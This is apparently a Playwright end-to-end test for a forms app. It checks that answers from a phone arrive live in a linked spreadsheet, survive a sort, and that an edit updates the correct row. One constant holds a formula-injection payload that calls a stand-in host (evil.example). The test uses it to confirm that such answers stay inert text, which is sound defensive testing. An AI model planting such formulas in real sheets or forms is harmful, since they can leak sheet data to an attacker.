import type { Browser, BrowserContext, Page } from "@playwright/test";

import { expect, ready, stamp, test } from "../fixtures";
import { BASE_URL } from "../lib/stack";

/** Forms WP-F1.5: a form's answers go live into a linked Sheet. The owner
 *  links a new sheet from Responses and opens it in another tab; people
 *  answer on a phone and their rows arrive in the open sheet (one answer
 *  looks like a formula and stays text); the owner sorts the sheet; an
 *  answer is changed and the right row — found by Response #, not by where
 *  it was — changes. The Sheet card says it's up to date, and deleting an
 *  answer says the sheet is left alone. */

const PHONE = { width: 375, height: 812 };
const EVIL = '=IMPORTXML("http://evil.example","//a")';
// The new sheet's column widths (forms/sheet.py ``header_tab``).
const COL_X = [0, 90, 240, 390, 590, 790];
const ROW_H = 20;

async function bearer(page: Page): Promise<string> {
  const seen = page.waitForRequest((r) => !!r.headers()["authorization"] && r.url().includes("/api/"));
  await page.goto("/forms");
  await ready(page);
  return (await seen).headers()["authorization"];
}

const text = (id: string, title: string, required = false) => ({
  id, kind: "short_text", title, description: "", image_asset_id: null, required, deleted: false,
  config: { validation: { kind: "any", min: null, max: null, integer: false }, min_length: null, max_length: null },
});

async function stranger(browser: Browser): Promise<{ context: BrowserContext; page: Page }> {
  const context = await browser.newContext({ baseURL: BASE_URL, viewport: PHONE, hasTouch: true, serviceWorkers: "block" });
  await context.route("**/version.json*", (r) => r.abort());
  return { context, page: await context.newPage() };
}

type Cell = { r: number; c: number; v: { v?: unknown; m?: unknown; f?: unknown; ct?: { fa?: string } } };
type Tab = { id: string; name: string; celldata?: Cell[] };

/** The saved sheet's "Form responses" tab as ``{"r,c": cell}``. Only the
 *  open editor's autosave writes it while the sheet is open. */
async function savedTab(page: Page, auth: string, sheetId: string): Promise<Record<string, Cell["v"]>> {
  const body = await (await page.request.get(`/api/files/${sheetId}/sheet`, { headers: { Authorization: auth } })).json();
  const tab = ((body.data ?? []) as Tab[]).find((t) => t.name === "Form responses");
  const out: Record<string, Cell["v"]> = {};
  for (const c of tab?.celldata ?? []) out[`${c.r},${c.c}`] = c.v;
  return out;
}
const shown = (v: Cell["v"] | undefined) => String(v?.v ?? v?.m ?? "");

async function answerOnPhone(browser: Browser, token: string, title: string, name: string, dish: string): Promise<{ context: BrowserContext; page: Page }> {
  const s = await stranger(browser);
  await s.page.goto(`/f/${token}`);
  await expect(s.page.getByRole("heading", { name: title })).toBeVisible({ timeout: 20_000 });
  await s.page.getByLabel("Your name").fill(name);
  await s.page.getByLabel("What will you bring?").fill(dish);
  // The server refuses answers sent within 3 seconds of opening the page.
  await s.page.waitForTimeout(3200);
  await s.page.getByRole("button", { name: "Submit" }).click();
  await expect(s.page.getByText("Your answer has been sent.")).toBeVisible({ timeout: 20_000 });
  return s;
}

/** Select a cell in the open sheet and read what the formula bar says. */
async function cellSays(sheet: Page, row: number, col: number): Promise<string> {
  const area = (await sheet.locator(".fortune-cell-area").boundingBox())!;
  // Somewhere else first: the formula bar only reads a cell when it's selected.
  const away = row === 6 ? 7 : 6;
  await sheet.mouse.click(area.x + COL_X[5] + 20, area.y + away * ROW_H + ROW_H / 2);
  await sheet.mouse.click(area.x + COL_X[col] + 20, area.y + row * ROW_H + ROW_H / 2);
  await expect(sheet.locator(".fortune-name-box")).toContainText(`${"ABCDEF"[col]}${row + 1}`);
  return (await sheet.locator(".fortune-fx-input").innerText()).trim();
}

test("answers arrive live in an open linked sheet, survive a sort, and an edit hits the right row", async ({ alice, browser }) => {
  test.setTimeout(240_000);
  const auth = await bearer(alice);
  const headers = { Authorization: auth };
  const title = `Picnic ${stamp}`;

  const made = await alice.request.post("/api/forms", { headers, data: {} });
  const fileId = (await made.json()).file.id as string;
  const definition = {
    version: 1, title, description: "", after: "continue",
    theme: { accent: "terracotta", header_asset_id: null, header_builtin: null, font: "default" },
    items: [text("name", "Your name", true), text("dish", "What will you bring?")],
  };
  expect((await alice.request.put(`/api/forms/${fileId}/definition`, { headers, data: { definition, data_version: 1 } })).ok()).toBe(true);
  expect((await alice.request.patch(`/api/forms/${fileId}/settings`, { headers, data: { accepting: true, audience: "link", allow_edit: true } })).ok()).toBe(true);
  const token = (await (await alice.request.post(`/api/forms/${fileId}/link`, { headers, data: {} })).json()).link.token as string;

  // Link a new sheet from the Responses tab.
  await alice.goto(`/files/form/${fileId}?tab=responses`);
  const card = alice.getByTestId("sheet-card");
  await expect(card.getByText("Keep every answer in a sheet")).toBeVisible({ timeout: 20_000 });
  await card.getByRole("button", { name: "Link to a sheet" }).click();
  const dialog = alice.getByTestId("link-sheet-dialog");
  await expect(dialog.getByLabel("Name")).toHaveValue(`${title} (Responses)`);
  await alice.getByRole("button", { name: "Link sheet" }).click();
  await expect(card.getByTestId("sheet-link")).toHaveText(`${title} (Responses)`, { timeout: 30_000 });
  await expect(card.getByTestId("sheet-status")).toContainText("up to date");
  const summary = await (await alice.request.get(`/api/forms/${fileId}/summary`, { headers })).json();
  const sheetId = summary.sheet.file_id as string;

  // Open it in another tab: the header row is there.
  const sheet = await alice.context().newPage();
  await sheet.goto(`/files/sheet/${sheetId}`);
  await expect(sheet.locator(".fortune-sheettab-container").getByText("Form responses", { exact: true })).toBeVisible({ timeout: 30_000 });
  await sheet.waitForTimeout(1500); // joined the room
  expect(await cellSays(sheet, 0, 0)).toBe("Response #");

  // Two people answer on a phone; the rows arrive in the open sheet.
  const ann = await answerOnPhone(browser, token, title, "Ann", EVIL);
  const editUrl = await ann.page.getByLabel("Save this link to change your answer later").inputValue();
  const bo = await answerOnPhone(browser, token, title, "Bo", "Bread");
  await bo.context.close();
  await expect.poll(async () => cellSays(sheet, 2, 3), { timeout: 30_000, intervals: [500, 1000] }).toBe("Bo");
  expect(await cellSays(sheet, 1, 3)).toBe("Ann");
  expect(await cellSays(sheet, 1, 0)).toBe("1");
  // The formula-looking answer is text: shown as typed, never run.
  expect(await cellSays(sheet, 1, 4)).toBe(EVIL);
  // The open editor saved them (the server leaves an open sheet's file to it).
  await expect.poll(async () => shown((await savedTab(alice, auth, sheetId))["2,3"]), { timeout: 30_000 }).toBe("Bo");
  const evil = (await savedTab(alice, auth, sheetId))["1,4"];
  expect(evil?.v).toBe(EVIL);
  expect(evil?.f).toBeUndefined();
  expect(evil?.ct?.fa).toBe("@");

  // The owner sorts the answers, newest first (Response # descending).
  const area = (await sheet.locator(".fortune-cell-area").boundingBox())!;
  await sheet.mouse.move(area.x + 20, area.y + ROW_H + 10);
  await sheet.mouse.down();
  await sheet.mouse.move(area.x + COL_X[4] + 40, area.y + 2 * ROW_H + 10, { steps: 6 });
  await sheet.mouse.up();
  await expect(sheet.locator(".fortune-name-box")).toContainText("A2:E3");
  await sheet.mouse.click(area.x + 60, area.y + ROW_H + 10, { button: "right" });
  await sheet.getByText("Descending sort", { exact: false }).first().click();
  await expect.poll(async () => cellSays(sheet, 1, 3), { timeout: 15_000 }).toBe("Bo");
  expect(await cellSays(sheet, 2, 3)).toBe("Ann");
  await sheet.waitForTimeout(1000); // the sort reached the room

  // Ann changes her answer on her phone, with the link she saved.
  await ann.page.goto(editUrl);
  await expect(ann.page.getByText(/You're changing your answer/)).toBeVisible({ timeout: 20_000 });
  await ann.page.getByLabel("Your name").fill("Annie");
  await ann.page.waitForTimeout(3200);
  await ann.page.getByRole("button", { name: "Save changes" }).click();
  await expect(ann.page.getByText("Your changes are saved.")).toBeVisible({ timeout: 20_000 });
  await ann.context.close();

  // Her row — now the third — changes; Bo's stays as it was.
  await expect.poll(async () => cellSays(sheet, 2, 3), { timeout: 30_000, intervals: [500, 1000] }).toBe("Annie");
  expect(await cellSays(sheet, 2, 0)).toBe("1");
  expect(await cellSays(sheet, 2, 2)).not.toBe(""); // Edited
  expect(await cellSays(sheet, 1, 3)).toBe("Bo");
  expect(await cellSays(sheet, 2, 4)).toBe(EVIL);
  expect(await cellSays(sheet, 3, 3)).toBe(""); // no duplicate row
  await sheet.screenshot({ path: test.info().outputPath("linked-sheet.png") });
  await expect.poll(async () => shown((await savedTab(alice, auth, sheetId))["2,3"]), { timeout: 30_000 }).toBe("Annie");

  // The card says it's up to date; deleting an answer says the sheet stays.
  await alice.bringToFront();
  await alice.reload();
  await expect(card.getByTestId("sheet-status")).toContainText("up to date", { timeout: 20_000 });
  await alice.getByRole("button", { name: "Individual" }).click();
  await alice.getByRole("button", { name: "Delete this answer" }).click();
  await expect(alice.getByText("Deleting an answer here doesn't change your sheet.")).toBeVisible();
  await alice.getByRole("button", { name: "Cancel" }).click();
});
